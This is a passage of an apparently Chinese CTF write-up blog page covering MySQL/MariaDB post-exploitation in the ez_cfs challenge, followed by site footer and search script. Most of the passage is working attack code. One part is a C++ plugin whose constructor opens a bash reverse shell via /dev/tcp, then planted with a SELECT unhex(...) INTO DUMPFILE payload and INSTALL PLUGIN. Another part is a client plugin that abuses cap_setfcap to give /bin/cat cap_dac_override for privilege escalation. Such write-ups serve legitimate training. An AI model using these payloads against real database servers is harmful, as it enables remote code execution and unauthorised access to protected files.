<h3 id="3-1-æ¢å¤-skip-grant-tables"><a href="#3-1-æ¢å¤-skip-grant-tables" class="headerlink" title="3.1 æ¢å¤ skip-grant-tables"></a>3.1 æ¢å¤ skip-grant-tables</h3><p>æ¢å¤ mysql çš„è¡¨ï¼Œå› ä¸ºä½¿ç”¨ skip-grant-tables å¯åŠ¨ï¼Œç¼ºå¤± mysql è¡¨ï¼Œæ— æ³•ä½¿ç”¨æ’ä»¶</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">mysql <span class="token operator">&gt;</span> <span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> mysql<span class="token punctuation">;</span>
mysql <span class="token operator">&gt;</span> <span class="token keyword">use</span> mysql<span class="token punctuation">;</span>
mysql <span class="token operator">&gt;</span> <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> plugin <span class="token punctuation">(</span> name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span> dl <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span>Aria transactional<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8mb3 <span class="token keyword">COLLATE</span> utf8mb3_general_ci <span class="token keyword">comment</span><span class="token operator">=</span><span class="token string">'MySQL plugins'</span><span class="token punctuation">;</span></code></pre>
<h3 id="3-2-MySQL-Plugin-RCE"><a href="#3-2-MySQL-Plugin-RCE" class="headerlink" title="3.2 MySQL Plugin RCE"></a>3.2 MySQL Plugin RCE</h3><p>ç¼–å†™æ’ä»¶</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>

<span class="token keyword">void</span> <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 &amp;'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">LIN</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token function">LIN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

LIN lin<span class="token punctuation">;</span>
LIN<span class="token operator">*</span> _mysql_plugin_interface_version_ <span class="token operator">=</span> <span class="token operator">&amp;</span>lin<span class="token punctuation">;</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">g++ lin.cpp <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-o</span> lin.so</code></pre>
<p>å°†ç¼–è¯‘å‡ºæ¥çš„ so æ–‡ä»¶ç”¨ <span class="hexo-wm">Ñ•ï»¿Â³vï½…ï½â€¢ï»¿ï»¿êœ±ğ¢â€Œâ€‹ï½”ğï»¿â€Œ</span>dumpfile å†™åˆ° /usr/lib/mysql/plugin/ ç›®å½•</p>
<pre class="language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"lin.so"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
sql <span class="token operator">=</span> <span class="token string">"select unhex('"</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%02X'</span> <span class="token operator">%</span> b <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"') into dumpfile '/usr/lib/mysql/plugin/lin.so';"</span>
f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload.sql"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span>sql<span class="token punctuation">)</span></code></pre>
<p>å°† payload.sql <span class="hexo-wm">ğ˜´â€‹ğŸ¯vâ„¯ğ˜¯â€¤ï»¿sğ˜ªâ€â€ğ’•eï»¿</span>ä¸Šä¼ è‡³ client ç«¯å¹¶è¿è¡Œ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token operator">&gt;</span> <span class="token builtin class-name">source</span> payload.sql<span class="token punctuation">;</span></code></pre>
<p>æœ€åå®‰è£…æ’ä»¶å<span class="hexo-wm">ğ˜€â€3â…´â„¯ğ˜¯Â·â€â€‹siâ€‹ğ­ğâ€</span>å¼¹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token operator">&gt;</span> INSTALL PLUGIN plugin_name SONAME <span class="token string">'lin.so'</span></code></pre>
<h2 id="4-ez-cfs-part4"><a href="#4-ez-cfs-part4" class="headerlink" title="4. ez_cfs_part4"></a>4. ez_cfs_part4</h2><p>å¯ä»¥çœ‹åˆ° <code>/flag_4</code> æ²¡æœ‰æƒé™è¯»å–ï¼Œæ‰¾ <code>suid</code> å’Œ <code>cap</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
getcap <span class="token parameter variable">-r</span> / <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">/usr/bin/mariadb <span class="token assign-left variable">cap_setfcap</span><span class="token operator">=</span>ep</code></pre>
<p>å¯ä»¥çœ‹åˆ° <code>/usr/bin/mariadb</code> æœ‰ <code>cap_setfcap</code> æƒé™<br>ä¹Ÿå°±æ˜¯æˆ‘ä»¬èƒ½ç»™å…¶ä»–æ–‡ä»¶è®¾ç½® <code>cap</code><br>ç»™ maria<span class="hexo-wm">sï»¿â€â‘¶ğ’—ï½…ğ§âˆ™ï»¿â€‹ğ˜´ğ˜ªâ€Œğ’•ğ˜¦â€</span>db å†™ä¸ªæ’ä»¶</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/capability.h&gt;</span></span>

<span class="token keyword">void</span> <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    cap_t caps <span class="token operator">=</span> <span class="token function">cap_from_text</span><span class="token punctuation">(</span><span class="token string">"cap_dac_override=eip"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">cap_set_file</span><span class="token punctuation">(</span><span class="token string">"/bin/cat"</span><span class="token punctuation">,</span> caps<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"setcap finished\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">LIN</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token function">LIN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

LIN _mysql_client_plugin_declaration_<span class="token punctuation">;</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">g++ cap.cpp <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-o</span> cap.so <span class="token parameter variable">-lcap2</span></code></pre>
<p>å°†ç¼–è¯‘å‡ºæ¥çš„æ–‡ä»¶ä¼ åˆ°é¶æœº,<br>ç„¶ååŠ è½½è¿™ä¸ª so è®© <code>/bin/cat</code> è·å– <code>cap_dac_override</code>ï¼ˆå¿½ç•¥æ–‡ä»¶æƒé™ï¼‰çš„ç‰¹æƒ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mariadb --plugin-dir<span class="token operator">=</span>. --default-auth<span class="token operator">=</span>cap
<span class="token function">cat</span> /flag_4</code></pre>
</body></html>
        </div>
        
          <div class="prev-or-next">
            <div class="post-foot-next">
              
                <a href="../2024-n1ctf-junior-writeup/" target="_self">
                  <i class="iconfont icon-chevronleft"></i>
                  <span>ä¸Šä¸€é¡µ</span>
                </a>
              
            </div>
            <div class="post-foot-prev">
              
                <a href="../2024-dubhectf-writeup/" target="_self">
                  <span>ä¸‹ä¸€é¡µ</span>
                  <i class="iconfont icon-chevronright"></i>
                </a>
              
            </div>
          </div>
        
      </div>
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="catalog-zoom">
      <div class="title">ç›®å½•</div>
      <div class="catalog-content">
        
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E4%BB%8B%E7%BB%8D"><span class="toc-text">æ¯”èµ›ä»‹ç»</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E6%A6%82%E5%86%B5"><span class="toc-text">æ¯”èµ›æ¦‚å†µ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1-php-hacker"><span class="toc-text">Week1 - php_hacker</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-POC"><span class="toc-text">1. POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2"><span class="toc-text">2. &lt;command&gt;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1-attack-shiro"><span class="toc-text">Week1 - attack_shiro</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%88%86%E7%A0%B4-shiro-%E5%AF%86%E9%92%A5"><span class="toc-text">1. çˆ†ç ´ shiro å¯†é’¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%88%86%E7%A0%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F"><span class="toc-text">2. çˆ†ç ´ååºåˆ—åŒ–åˆ©ç”¨é“¾åŠå›æ˜¾æ–¹å¼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-RCE"><span class="toc-text">3. RCE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1-ez-sqli"><span class="toc-text">Week1 - ez_sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%88-login%EF%BC%89"><span class="toc-text">1. ç™»å½•ç•Œé¢ï¼ˆ&#x2F;loginï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%90%9C%E7%B4%A2%E7%95%8C%E9%9D%A2%EF%BC%88-search%EF%BC%89"><span class="toc-text">2. æœç´¢ç•Œé¢ï¼ˆ&#x2F;searchï¼‰</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1-ez-cat"><span class="toc-text">Week1 - ez_cat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Tomcat-%E5%90%8E%E5%8F%B0-jsp-shell-%E4%B8%8A%E4%BC%A0"><span class="toc-text">1. Tomcat åå° jsp shell ä¸Šä¼ </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-suid-perm-%E4%BD%BF%E7%94%A8-date-%E6%8F%90%E6%9D%83"><span class="toc-text">2. suid perm ä½¿ç”¨ date ææƒ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1-java-signin"><span class="toc-text">Week1 - java_signin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week2-ez-spring"><span class="toc-text">Week2 - ez_spring</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week3-ez-cfs"><span class="toc-text">Week3 - ez_cfs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-text">ç½‘ç»œæ‹“æ‰‘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-ez-cfs-part1"><span class="toc-text">1. ez_cfs_part1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-Jackson-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-text">1.1 Jackson åŸç”Ÿååºåˆ—åŒ–é“¾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A"><span class="toc-text">1.2 æ³¨æ„ç‚¹ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-1-%E5%88%A0%E9%99%A4-BaseJsonNode-writeReplace"><span class="toc-text">1.2.1 åˆ é™¤ BaseJsonNode.writeReplace</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-2-%E6%8A%9B%E5%87%BA-AmqpRejectAndDontRequeueException-%E5%BC%82%E5%B8%B8"><span class="toc-text">1.2.2 æŠ›å‡º AmqpRejectAndDontRequeueException å¼‚å¸¸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-3-%E6%B6%88%E6%81%AF%E6%9C%AA%E5%A4%84%E7%90%86%EF%BC%8C%E5%88%A0%E9%99%A4%E9%98%9F%E5%88%97"><span class="toc-text">1.2.3 æ¶ˆæ¯æœªå¤„ç†ï¼Œåˆ é™¤é˜Ÿåˆ—</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ez-cfs-part2"><span class="toc-text">2. ez_cfs_part2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%8E%A2%E6%9F%A5%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83"><span class="toc-text">2.1 æ¢æŸ¥å†…ç½‘ç¯å¢ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%8F%8D%E5%BC%B9-tty"><span class="toc-text">2.2 åå¼¹ tty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E8%BF%9E%E6%8E%A5-MySQL"><span class="toc-text">2.3 è¿æ¥ MySQL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-ez-cfs-part3"><span class="toc-text">3. ez_cfs_part3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%81%A2%E5%A4%8D-skip-grant-tables"><span class="toc-text">3.1 æ¢å¤ skip-grant-tables</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-MySQL-Plugin-RCE"><span class="toc-text">3.2 MySQL Plugin RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-ez-cfs-part4"><span class="toc-text">4. ez_cfs_part4</span></a></li></ol></li></ol>
        
      </div>
    </div>
  </div>

  
<script src="../../js/catalog.js"></script>




    
  </div>
  <script>
    (() => {
      function compensate() {
        const bodyBox = document.querySelector('.zoom-wrap');
        if (bodyBox) {
          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
          bodyBox.style.marginBottom = `-${gapY}px`;
        }

        const catBox = document.querySelector('.catalog-zoom');
        if (catBox) {
          const rect = catBox.getBoundingClientRect();
          const gapX = catBox.offsetWidth  - rect.width;
          const gapY = catBox.offsetHeight - rect.height;

          const list = catBox.querySelector('.catalog-content');
          if (list) {
            const orig = list.dataset.origHeight
                      ? parseFloat(list.dataset.origHeight)
                      : parseFloat(getComputedStyle(list).height);
            list.dataset.origHeight = orig;
            list.style.height       = (orig + gapY) + 'px';
          }

          catBox.style.marginRight  = `-${gapX}px`;
          catBox.style.marginBottom = `-${gapY}px`;
        }
      }

      function hookImages(root = document) {
        root.querySelectorAll('img').forEach(img => {
          if (img.dataset._scaledFix) return;
          img.dataset._scaledFix = 1;
          img.addEventListener('load', compensate, {once: true});
        });
      }

      addEventListener('DOMContentLoaded', () => {
        compensate();
        hookImages();
      });

      addEventListener('resize', compensate);

      const observer = new MutationObserver(muts => {
        muts.forEach(m => {
          m.addedNodes.forEach(n => {
            if (n.nodeType !== 1) return;
            if (n.tagName === 'IMG') hookImages(n.parentNode);
            else hookImages(n);
          });
        });
      });

      const wrap = document.querySelector('.zoom-wrap');
      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
    })();
  </script>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" href="https://github.com/security-s3ven">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/security-s3ven">Copyright Â© 2023-2026 s3ven</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="../../js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="æœç´¢...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>é¦–æ¬¡æœç´¢ï¼Œæ­£åœ¨è½½å…¥ç´¢å¼•æ–‡ä»¶ï¼Œè¯·ç¨åâ€¦â€¦<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼Œè¯·å°è¯•æ›´æ¢æ£€ç´¢è¯ã€‚<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>æœªæ‰¾åˆ°search.xmlæ–‡ä»¶ï¼Œå…·ä½“è¯·å‚è€ƒï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>è¯·æ±‚å¤±è´¥ï¼Œå°è¯•é‡æ–°åˆ·æ–°é¡µé¢æˆ–ç¨åé‡è¯•ã€‚<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="../../js/colorscheme.js"></script>





        

      </div>
    </div>
  </body>
</html>
